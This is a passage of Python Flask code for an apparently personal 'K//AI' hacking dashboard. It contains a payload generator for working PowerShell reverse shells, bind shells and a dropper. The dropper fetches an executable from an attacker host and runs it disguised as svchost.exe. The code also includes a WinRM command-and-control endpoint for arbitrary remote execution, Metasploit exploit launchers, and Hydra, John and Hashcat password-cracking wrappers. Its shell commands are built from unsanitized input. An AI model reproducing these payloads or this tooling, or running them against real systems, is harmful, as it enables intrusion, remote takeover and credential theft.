            f"Test-Path '\\\\{ip}\\IPC$' -ErrorAction SilentlyContinue"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        if "True" in r:
            findings.append({"service": "SMB", "test": "null session", "result": "VULNERABLE", "detail": "IPC$ reachable"})
        else:
            findings.append({"service": "SMB", "test": "null session", "result": "SECURE", "detail": "IPC$ blocked"})

        # RDP BlueKeep scan (port check + OS version hint)
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            f"Test-NetConnection -ComputerName {ip} -Port 3389 -WarningAction SilentlyClose -InformationLevel Quiet | Select -First 1"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        if "True" in r:
            findings.append({"service": "RDP", "test": "BlueKeep (CVE-2019-0708)", "result": "POTENTIAL", "detail": "Port 3389 open — check OS version"})
        else:
            findings.append({"service": "RDP", "test": "BlueKeep (CVE-2019-0708)", "result": "SECURE", "detail": "Port 3389 closed"})

        # HTTP server header grab
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            f"try{{(Invoke-WebRequest -Uri 'http://{ip}:80' -TimeoutSec 3 -UseBasicParsing -ErrorAction Stop).Headers['Server']}}catch{{''}}"],
            capture_output=True, text=True, timeout=8).stdout.strip()
        if r:
            findings.append({"service": "HTTP", "test": "server header", "result": "INFO", "detail": r[:60]})
            # Apache 2.4.49 CVE-2021-41773
            if "Apache/2.4.49" in r:
                findings.append({"service": "HTTP", "test": "CVE-2021-41773", "result": "CRITICAL", "detail": "Apache 2.4.49 path traversal"})

        # Quick SMB share enumeration
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            f"net view \\\\{ip} 2>&1 | Select-String 'Disk'"],
            capture_output=True, text=True, timeout=10).stdout.strip()
        shares = [l.strip() for l in r.split("\n") if "Disk" in l] if r else []
        if shares:
            findings.append({"service": "SMB", "test": "shares", "result": "EXPOSED", "detail": "; ".join(shares[:5])})

        threat = sum(50 for f in findings if f["result"] == "CRITICAL") + \
                 sum(30 for f in findings if f["result"] == "VULNERABLE") + \
                 sum(15 for f in findings if f["result"] == "POTENTIAL") + \
                 sum(5 for f in findings if f["result"] == "EXPOSED")

        return flask.jsonify({"ip": ip, "findings": findings, "threat_score": min(threat, 100)})
    except Exception as e:
        return flask.jsonify({"ip": ip, "error": str(e), "findings": []})

# ── Remote C2 (WinRM) ─────────────────────────────────────────────────

_C2_SESSIONS: dict = {}

@app.post("/c2/connect")
def c2_connect():
    data = flask.request.json
    ip = str(data.get("ip", "")).strip()
    user = str(data.get("user", "")).strip()
    pwd = str(data.get("pwd", "")).strip()
    if not ip:
        return flask.jsonify({"error": "no ip"})
    try:
        cred = f" -Credential (New-Object System.Management.Automation.PSCredential('{user}',(ConvertTo-SecureString '{pwd}' -AsPlainText -Force)))" if user else ""
        cmd = f"Invoke-Command -ComputerName {ip}{cred} -ScriptBlock {{ hostname }} -ErrorAction Stop"
        r = subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                           capture_output=True, text=True, timeout=15).stdout.strip()
        if r:
            sid = f"c2-{int(time.time())}"
            _C2_SESSIONS[sid] = {"ip": ip, "user": user or "default", "connected": time.time()}
            return flask.jsonify({"ok": True, "id": sid, "hostname": r})
        return flask.jsonify({"error": "connection failed", "raw": r[:200]})
    except Exception as e:
        return flask.jsonify({"error": str(e)})

@app.post("/c2/exec")
def c2_exec():
    data = flask.request.json
    sid = str(data.get("sid", "")).strip()
    command = str(data.get("command", "")).strip()
    session = _C2_SESSIONS.get(sid)
    if not session:
        return flask.jsonify({"error": "no session"})
    try:
        ip = session["ip"]
        user = session.get("user", "")
        cred = f" -Credential (New-Object System.Management.Automation.PSCredential('{user}',(ConvertTo-SecureString '' -AsPlainText -Force)))" if user else ""
        cmd = f"Invoke-Command -ComputerName {ip}{cred} -ScriptBlock {{ {command} }} -ErrorAction Stop"
        r = subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                           capture_output=True, text=True, timeout=30).stdout.strip()
        return flask.jsonify({"ok": True, "output": r[:2000]})
    except Exception as e:
        return flask.jsonify({"error": str(e)})

@app.get("/c2/sessions")
def c2_sessions():
    return flask.jsonify(list(_C2_SESSIONS.values()))

@app.delete("/c2/session/<sid>")
def c2_kill(sid):
    _C2_SESSIONS.pop(sid, None)
    return flask.jsonify({"ok": True})

# ── Payload Workshop ──────────────────────────────────────────────────

@app.post("/payload/generate")
def payload_gen():
    data = flask.request.json
    ptype = str(data.get("type", "reverse")).strip()
    ip = str(data.get("ip", "")).strip()
    port = str(data.get("port", "4444")).strip()
    if ptype == "reverse":
        code = f"""$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"""
        return flask.jsonify({"ok": True, "payload": code, "language": "powershell", "type": "reverse shell"})
    elif ptype == "bind":
        code = f"""$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close();$l.Stop()"""
        return flask.jsonify({"ok": True, "payload": code, "language": "powershell", "type": "bind shell"})
    elif ptype == "dropper":
        code = "$u='http://"+ip+"/payload.exe';$d=\"$env:TEMP\\svchost.exe\";(New-Object Net.WebClient).DownloadFile($u,$d);Start-Process $d"
        return flask.jsonify({"ok": True, "payload": code, "language": "powershell", "type": "dropper"})
    return flask.jsonify({"error": "unknown type"})

# ── Op Report Generator ───────────────────────────────────────────────

@app.get("/report")
def op_report():
    try:
        kai = get_kai()
        devices = kai._ctos.db.all_devices() if hasattr(kai, "_ctos") and kai._ctos else []
        lines = []
        lines.append(f"# K//AI Operation Report")
        lines.append(f"**Generated**: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"**Host**: {os.environ.get('COMPUTERNAME', 'unknown')}")
        lines.append("")
        lines.append("## Network Inventory")
        lines.append(f"**Total devices discovered**: {len(devices)}")
        lines.append("")
        lines.append("| IP | Hostname | Vendor | OS | Ports | Type |")
        lines.append("|---|---|---|---|---|---|")
        for d in devices:
            ip = d.get("ip", "?")
            host = d.get("hostname", "-")
            vendor = d.get("vendor", "-")
            os_ = d.get("os", "-")
            ports = ",".join(str(p.get("port", "")) for p in (d.get("ports", []) or [])[:8])
            dtype = d.get("type", "?")
            lines.append(f"| {ip} | {host} | {vendor} | {os_} | {ports} | {dtype} |")
        lines.append("")
        lines.append("## Open Services Summary")
        port_counts = {}
        for d in devices:
            for p in (d.get("ports", []) or []):
                pn = p.get("port") if isinstance(p, dict) else p
                port_counts[pn] = port_counts.get(pn, 0) + 1
        for pn, cnt in sorted(port_counts.items()):
            lines.append(f"- **Port {pn}**: {cnt} device(s)")
        lines.append("")
        lines.append("---")
        lines.append("*Report auto-generated by K//AI*")
        return flask.jsonify({"ok": True, "report": "\n".join(lines), "format": "markdown", "filename": f"kai-report-{time.strftime('%Y%m%d-%H%M%S')}.md"})
    except Exception as e:
        return flask.jsonify({"error": str(e)})

# ── System Stats ──────────────────────────────────────────────────────
_CPU_HISTORY: list = []
_NET_HISTORY: list = []
_SCAN_DONE = False

@app.get("/system/stats")
def system_stats():
    try:
        cpu = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average | Select -ExpandProperty Average"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        cpu = int(float(cpu)) if cpu else 0
        mem = subprocess.run(["powershell", "-NoProfile", "-Command",
            "$os=Get-CimInstance Win32_OperatingSystem; [math]::Round(($os.TotalVisibleMemorySize-$os.FreePhysicalMemory)/$os.TotalVisibleMemorySize*100)"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        mem = int(float(mem)) if mem else 0
        disk = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select @{N='Pct';E={[math]::Round(($_.Size-$_.FreeSpace)/$_.Size*100)}} | Select -ExpandProperty Pct"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        disk = int(float(disk.split()[0])) if disk else 0
        net = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-NetAdapterStatistics | Measure-Object -Property ReceivedBytes,SentBytes -Sum | Select -ExpandProperty Sum"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        parts = net.split()
        rx = int(parts[0]) if len(parts) > 0 else 0
        tx = int(parts[1]) if len(parts) > 1 else 0
        now = time.time()
        _CPU_HISTORY.append((now, cpu, mem, disk))
        _CPU_HISTORY[:] = _CPU_HISTORY[-120:]
        _NET_HISTORY.append((now, rx, tx))
        _NET_HISTORY[:] = _NET_HISTORY[-120:]
        return flask.jsonify({
            "cpu": cpu, "memory": mem, "disk": disk,
            "net_rx": rx, "net_tx": tx,
            "cpu_history": [{"t": t, "v": v} for t, v, _, _ in _CPU_HISTORY],
            "mem_history": [{"t": t, "v": v} for _, t, v, _ in _CPU_HISTORY],
            "net_history": [{"t": t, "rx": r, "tx": x} for t, r, x in _NET_HISTORY],
        })
    except Exception as e:
        return flask.jsonify({"cpu": 0, "memory": 0, "disk": 0, "net_rx": 0, "net_tx": 0, "error": str(e)})

# ── Traffic / Top Connections ────────────────────────────────────────

@app.get("/traffic/top")
def traffic_top():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | "
            "Group-Object -Property RemoteAddress | Sort Count -Descending | "
            "Select -First 15 @{N='Remote';E={$_.Name}},Count,@{N='Ports';E={($_.Group.RemotePort -join ',')}} | "
            "ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=8).stdout.strip()
        conns = json.loads(r) if r else []
        if isinstance(conns, dict):
            conns = [conns]
        total = subprocess.run(["powershell", "-NoProfile", "-Command",
            "(Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue).Count"],
            capture_output=True, text=True, timeout=3).stdout.strip()
        total_conns = int(total) if total else 0
        return flask.jsonify({"connections": conns, "total": total_conns})
    except Exception as e:
        return flask.jsonify({"connections": [], "total": 0, "error": str(e)})

# ── Geolocation ────────────────────────────────────────────────────────

@app.get("/geo")
def geo():
    try:
        import urllib.request
        r = urllib.request.urlopen("https://ip-api.com/json/?fields=query,city,region,country,lat,lon,isp,org", timeout=5)
        data = json.loads(r.read().decode())
        return flask.jsonify(data)
    except Exception:
        return flask.jsonify({"query": "unknown", "city": "unknown", "region": "", "country": "unknown", "lat": 0, "lon": 0})

# ── Weather ────────────────────────────────────────────────────────────

@app.get("/weather")
def weather():
    try:
        import urllib.request
        geo_resp = urllib.request.urlopen("https://ip-api.com/json/?fields=lat,lon", timeout=5)
        geo = json.loads(geo_resp.read().decode())
        lat, lon = geo.get("lat", 40.7), geo.get("lon", -74.0)
        w = urllib.request.urlopen(f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m&timezone=auto", timeout=5)
        data = json.loads(w.read().decode())
        current = data.get("current", {})
        codes = {0:"Clear",1:"Mainly clear",2:"Partly cloudy",3:"Overcast",45:"Fog",48:"Rime fog",51:"Light drizzle",53:"Drizzle",55:"Heavy drizzle",61:"Slight rain",63:"Rain",65:"Heavy rain",71:"Slight snow",73:"Snow",75:"Heavy snow",80:"Slight showers",81:"Showers",82:"Heavy showers",95:"Thunderstorm",96:"Thunderstorm slight hail",99:"Thunderstorm heavy hail"}
        wcode = current.get("weather_code", 0)
        return flask.jsonify({
            "temp": current.get("temperature_2m"), "feels_like": current.get("apparent_temperature"),
            "humidity": current.get("relative_humidity_2m"), "wind": current.get("wind_speed_10m"),
            "condition": codes.get(wcode, f"Code {wcode}"), "code": wcode
        })
    except Exception:
        return flask.jsonify({"temp": "--", "feels_like": "--", "humidity": "--", "wind": "--", "condition": "unknown"})

# ── Metasploit (msfconsole interactive + one-shot) ──────────────────────

@app.route("/msf/start", methods=["POST"])
def msf_start():
    try:
        msg = get_msf().ensure_daemon()
        return flask.jsonify({"ok": True, "message": msg})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/msf/stop", methods=["POST"])
def msf_stop():
    try:
        msg = get_msf().stop_daemon()
        return flask.jsonify({"ok": True, "message": msg})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/msf/status", methods=["GET"])
def msf_status():
    try:
        msf = get_msf()
        return flask.jsonify({"running": msf.interactive_running})
    except Exception as exc:
        return flask.jsonify({"running": False, "error": str(exc)})

@app.route("/msf/version", methods=["GET"])
def msf_version():
    try:
        return flask.jsonify(get_msf().get_version())
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/command", methods=["POST"])
def msf_command():
    """Send a command to the interactive msfconsole."""
    try:
        msf = get_msf()
        if not msf.interactive_running:
            return flask.jsonify({"error": "msfconsole not running"})
        data = flask.request.json or {}
        cmd = data.get("command", "")
        if not cmd:
            return flask.jsonify({"error": "command required"})
        result = msf.send_command(cmd, timeout=data.get("timeout", 60))
        return flask.jsonify(result)
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/run/script", methods=["POST"])
def msf_run_script():
    """Execute a list of steps as a resource script."""
    try:
        msf = get_msf()
        data = flask.request.json or {}
        steps = data.get("steps", [])
        if not steps:
            return flask.jsonify({"error": "steps required"})
        return flask.jsonify(msf.run_script(steps, timeout=data.get("timeout", 120)))
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/sessions", methods=["GET"])
def msf_sessions():
    try:
        return flask.jsonify(get_msf().list_sessions())
    except Exception as exc:
        return flask.jsonify({"sessions": {}, "error": str(exc)})

@app.route("/msf/exploit", methods=["POST"])
def msf_exploit():
    try:
        data = flask.request.json or {}
        module = data.get("module", "")
        payload = data.get("payload", "")
        target = data.get("target", "")
        port = data.get("port", "")
        if not module or not target:
            return flask.jsonify({"error": "module and target required"})
        opts = dict(data.get("options", {}))
        if payload:
            opts["PAYLOAD"] = payload
        opts["RHOSTS"] = target
        if port:
            opts["RPORT"] = str(port)
        return flask.jsonify(get_msf().execute_module("exploit", module, opts))
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/auxiliary", methods=["POST"])
def msf_auxiliary():
    try:
        data = flask.request.json or {}
        module = data.get("module", "")
        target = data.get("target", "")
        port = data.get("port", "")
        if not module or not target:
            return flask.jsonify({"error": "module and target required"})
        opts = dict(data.get("options", {}))
        opts["RHOSTS"] = target
        if port:
            opts["RPORT"] = str(port)
        return flask.jsonify(get_msf().execute_module("auxiliary", module, opts))
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/resource", methods=["POST"])
def msf_resource():
    try:
        data = flask.request.json or {}
        steps = data.get("steps", [])
        rc = get_msf().generate_resource_script(steps)
        return flask.jsonify({"script": rc})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/jobs", methods=["GET"])
def msf_jobs():
    try:
        return flask.jsonify(get_msf().list_jobs())
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/db/status", methods=["GET"])
def msf_db_status():
    try:
        return flask.jsonify(get_msf().db_status())
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/msf/db/hosts", methods=["GET"])
def msf_db_hosts():
    try:
        return flask.jsonify(get_msf().db_hosts())
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

# ── OWASP ZAP ───────────────────────────────────────────────────────────

@app.route("/zap/start", methods=["POST"])
def zap_start():
    try:
        zap = get_zap()
        data = flask.request.json or {}
        port = int(data.get("port", 8080))
        key = data.get("api_key", "kaizap2024")
        msg = zap.ensure_daemon()
        return flask.jsonify({"ok": True, "message": msg})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/zap/stop", methods=["POST"])
def zap_stop():
    try:
        msg = get_zap().stop_daemon()
        return flask.jsonify({"ok": True, "message": msg})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/zap/status", methods=["GET"])
def zap_status():
    try:
        zap = get_zap()
        running = zap._ping()
        ver = zap.version() if running else {}
        return flask.jsonify({"running": running, "version": ver})
    except Exception as exc:
        return flask.jsonify({"running": False, "error": str(exc)})

@app.route("/zap/scan", methods=["POST"])
def zap_scan():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        data = flask.request.json or {}
        url = data.get("url", "")
        if not url:
            return flask.jsonify({"error": "url required"})
        max_children = int(data.get("max_children", 10))
        recurse = data.get("recurse", True)
        mode_resp = zap.set_mode("attack")
        spider = zap.start_spider(url, max_children=max_children, recurse=recurse)
        spider_id = spider.get("scan")
        if not spider_id:
            return flask.jsonify({"error": "Failed to start spider", "response": spider})
        return flask.jsonify({"ok": True, "spider_id": spider_id, "message": "Spider started"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/spider/status/<scan_id>", methods=["GET"])
def zap_spider_status(scan_id):
    try:
        return flask.jsonify(get_zap().spider_status(scan_id))
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/ascan/start", methods=["POST"])
def zap_ascan_start():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        data = flask.request.json or {}
        url = data.get("url", "")
        if not url:
            return flask.jsonify({"error": "url required"})
        ascanner = zap.start_active_scan(url, recurse=data.get("recurse", True))
        scan_id = ascanner.get("scan")
        if not scan_id:
            return flask.jsonify({"error": "Failed to start active scan", "response": ascanner})
        return flask.jsonify({"ok": True, "scan_id": scan_id, "message": "Active scan started"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/ascan/status/<scan_id>", methods=["GET"])
def zap_ascan_status(scan_id):
    try:
        return flask.jsonify(get_zap().active_scan_status(scan_id))
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/alerts", methods=["POST"])
def zap_alerts():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        data = flask.request.json or {}
        base_url = data.get("url", "")
        risk = data.get("risk", "")
        alerts_resp = zap.alerts(base_url=base_url, risk=risk)
        summary = zap.alert_summary(base_url=base_url)
        return flask.jsonify({"alerts": alerts_resp, "summary": summary})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/fullscan", methods=["POST"])
def zap_fullscan():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        data = flask.request.json or {}
        url = data.get("url", "")
        if not url:
            return flask.jsonify({"error": "url required"})
        max_children = int(data.get("max_children", 10))
        recurse = data.get("recurse", True)
        result = zap.run_full_scan(url, max_children=max_children, recurse=recurse)
        return flask.jsonify({"ok": True, "result": result})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/report/html", methods=["GET"])
def zap_report_html():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        html = zap.generate_html_report()
        return flask.Response(html, mimetype="text/html")
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

@app.route("/zap/report/markdown", methods=["GET"])
def zap_report_markdown():
    try:
        zap = get_zap()
        if not zap._ping():
            return flask.jsonify({"error": "ZAP daemon not running"})
        md = zap.generate_markdown_report()
        return flask.Response(md, mimetype="text/markdown")
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

# ── Burp Suite Community Edition ────────────────────────────────────────

_BURP_PROCESS = None

@app.route("/burp/start", methods=["POST"])
def burp_start():
    global _BURP_PROCESS
    try:
        if _BURP_PROCESS and _BURP_PROCESS.poll() is None:
            return flask.jsonify({"ok": True, "message": "Burp already running"})
        data = flask.request.json or {}
        jar_path = data.get("path", "")
        if not jar_path:
            candidates = [
                "C:\\Program Files\\BurpSuiteCommunity\\burpsuite_community.jar",
                "C:\\Program Files\\BurpSuitePro\\burpsuite_pro.jar",
            ]
            for c in candidates:
                if Path(c).exists():
                    jar_path = c
                    break
        if not jar_path:
            return flask.jsonify({"error": "Burp Suite jar not found. Specify path."})
        project = data.get("project", "")
        cmd = ["java", "-jar", jar_path]
        if project:
            cmd.extend(["--project-file", project])
        _BURP_PROCESS = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return flask.jsonify({"ok": True, "message": f"Burp Suite launched (PID {_BURP_PROCESS.pid})"})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/burp/stop", methods=["POST"])
def burp_stop():
    global _BURP_PROCESS
    try:
        if _BURP_PROCESS and _BURP_PROCESS.poll() is None:
            _BURP_PROCESS.terminate()
            _BURP_PROCESS.wait(timeout=5)
            _BURP_PROCESS = None
            return flask.jsonify({"ok": True, "message": "Burp Suite stopped"})
        return flask.jsonify({"ok": True, "message": "Burp was not running"})
    except Exception as exc:
        return flask.jsonify({"ok": False, "error": str(exc)})

@app.route("/burp/status", methods=["GET"])
def burp_status():
    global _BURP_PROCESS
    try:
        running = _BURP_PROCESS is not None and _BURP_PROCESS.poll() is None
        return flask.jsonify({"running": running})
    except Exception as exc:
        return flask.jsonify({"running": False, "error": str(exc)})

# ── Tool Kit (Hydra, Netcat, John, Hashcat, Searchsploit) ──────────────

@app.route("/tools/run", methods=["POST"])
def tools_run():
    """Run a registered security tool via WSL Kali."""
    try:
        data = flask.request.json or {}
        tool = data.get("tool", "").strip().lower()
        params = data.get("params", {})
        timeout = int(data.get("timeout", 300))
        if not tool:
            return flask.jsonify({"error": "tool required"})
        commands = {
            "hydra": _cmd_hydra,
            "john": _cmd_john,
            "hashcat": _cmd_hashcat,
            "searchsploit": _cmd_searchsploit,
            "netcat": _cmd_netcat,
            "nmap": _cmd_nmap_tool,
        }
        cmd_fn = commands.get(tool)
        if not cmd_fn:
            return flask.jsonify({"error": f"Unknown tool '{tool}'. Available: {', '.join(commands.keys())}"})
        cmd = cmd_fn(params)
        if cmd.get("error"):
            return flask.jsonify(cmd)
        r = subprocess.run(
            ["wsl.exe", "-d", "kali-linux", "--", "bash", "-lc", cmd["command"]],
            capture_output=True, text=True, timeout=timeout
        )
        return flask.jsonify({
            "ok": True, "tool": tool, "command": cmd["command"],
            "stdout": r.stdout.strip()[:5000], "stderr": r.stderr.strip()[:2000],
            "returncode": r.returncode,
        })
    except subprocess.TimeoutExpired:
        return flask.jsonify({"error": f"{tool} timed out after {timeout}s"})
    except Exception as exc:
        return flask.jsonify({"error": str(exc)})

def _cmd_hydra(params: dict) -> dict:
    target = params.get("target", "")
    service = params.get("service", "ssh")
    username = params.get("username", "root")
    wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    extra = params.get("extra", "")
    if not target:
        return {"error": "target required"}
    cmd = f"hydra -l {username} -P {wordlist} {service}://{target} {extra}"
    return {"command": cmd.strip()}

def _cmd_john(params: dict) -> dict:
    hash_text = params.get("hash", params.get("hash_file", ""))
    fmt = params.get("format", "")
    wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    if not hash_text:
        return {"error": "hash or hash_file required"}
    tmp = f"/tmp/kai_john_{int(time.time()*1000)}.txt"
    extra = f"--format={fmt} " if fmt else ""
    return {"command": f"echo '{hash_text}' > {tmp} && john {extra}--wordlist={wordlist} {tmp} && john --show {tmp}; rm -f {tmp}"}

def _cmd_hashcat(params: dict) -> dict:
    hash_text = params.get("hash", "")
    mode = params.get("mode", "0")
    wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    if not hash_text:
        return {"error": "hash required"}
    tmp = f"/tmp/kai_hashcat_{int(time.time()*1000)}.txt"
    extra = params.get("extra", "")
    return {"command": f"echo '{hash_text}' > {tmp} && hashcat -m {mode} -a 0 {tmp} {wordlist} {extra} 2>&1; rm -f {tmp}"}

def _cmd_searchsploit(params: dict) -> dict:
    query = params.get("query", "")
    if not query:
        return {"error": "query required"}
    return {"command": f"searchsploit -t -w '{query}' 2>&1 | head -80"}

def _cmd_netcat(params: dict) -> dict:
    mode = params.get("mode", "scan")
    target = params.get("target", "")
    port = params.get("port", "")
    extra = params.get("extra", "")
    if mode == "listen":
        if not port:
            return {"error": "port required for listen mode"}
        return {"command": f"timeout 30 nc -lvnp {port} {extra} 2>&1 || true"}
    elif mode == "banner":
        if not target or not port:
            return {"error": "target and port required for banner grab"}
        return {"command": f"echo 'GET / HTTP/1.0\r\n\r\n' | timeout 10 nc -w 3 {target} {port} {extra} 2>&1 || true"}
    elif mode == "scan":
        if not target or not port:
            return {"error": "target and port(s) required"}
        return {"command": f"timeout 30 nc -zv {target} {port} {extra} 2>&1 || true"}
    return {"error": f"unknown mode: {mode}"}

def _cmd_nmap_tool(params: dict) -> dict:
    target = params.get("target", "")
    flags = params.get("flags", "-sn")
    if not target:
        return {"error": "target required"}
    return {"command": f"nmap {flags} {target} 2>&1 | head -100"}

# ── Threat Feed ────────────────────────────────────────────────────────

@app.get("/threats")
def threats():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 10 -ErrorAction SilentlyContinue | "
            "Select TimeCreated, @{N='Source';E={$_.Properties[5].Value}},@{N='User';E={$_.Properties[1].Value}} | "
            "ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=8).stdout.strip()
        failed_logins = json.loads(r) if r else []
        if isinstance(failed_logins, dict):
            failed_logins = [failed_logins]
        r2 = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=5157} -MaxEvents 5 -ErrorAction SilentlyContinue | "
            "Select TimeCreated,@{N='Source';E={$_.Properties[1].Value}},@{N='Detail';E={$_.Properties[5].Value}} | "
            "ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=8).stdout.strip()
        blocked = json.loads(r2) if r2 else []
        if isinstance(blocked, dict):
            blocked = [blocked]
        threats_list = []
        for fl in failed_logins:
            threats_list.append({"type": "FAILED_LOGIN", "severity": "warn",
                "source": fl.get("Source", "?"), "detail": f"Failed login from {fl.get('User','?')}",
                "timestamp": str(fl.get("TimeCreated", ""))[:19]})
        for bl in blocked:
            threats_list.append({"type": "BLOCKED_CONNECTION", "severity": "alert",
                "source": bl.get("Source", "?"), "detail": bl.get("Detail", "Connection blocked"),
                "timestamp": str(bl.get("TimeCreated", ""))[:19]})
        return flask.jsonify({"threats": threats_list[:15]})
    except Exception:
        return flask.jsonify({"threats": []})

# ── Counter-Surveillance Watchdogs (extended types via existing /watch/add) ──
# Port scan detect, RDP auth watch, ARP spoof detect
# These use the same /watch/add endpoint with type="counterscan", "counterrdp", "counterarp"

if __name__ == "__main__":
    import webbrowser
    import time

    PORT = 5555

    print("=" * 50)
    print("  K//AI COMPANION")
    print("  Kai - JARVIS-class AI partner")
    print("  Breed: Black & Tan Shiba Inu")
    print("=" * 50)
    print()

    import socket
    for try_port in range(PORT, PORT + 50):
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("::1", try_port))
            s.close()
            PORT = try_port
            break
        except OSError:
            s.close()
            continue

    print(f"  >>>  http://localhost:{PORT}  <<<")
    print()
    print("  Providers: groq -> deepseek -> ollama")
    print("  Ctrl+C to stop")
    print()

    def _open_browser():
        time.sleep(1.5)
        try:
            webbrowser.open(f"http://localhost:{PORT}")
        except Exception:
            pass

    threading.Thread(target=_open_browser, daemon=True).start()

    app.run(host="::1", port=PORT, debug=False, threaded=True)
    # Note: IPv6 loopback (::1) used because Windows Defender WFP filter
    # blocks IPv4 TCP on python.exe. Access via http://localhost:{PORT}
    # (Windows resolves localhost to ::1 automatically).
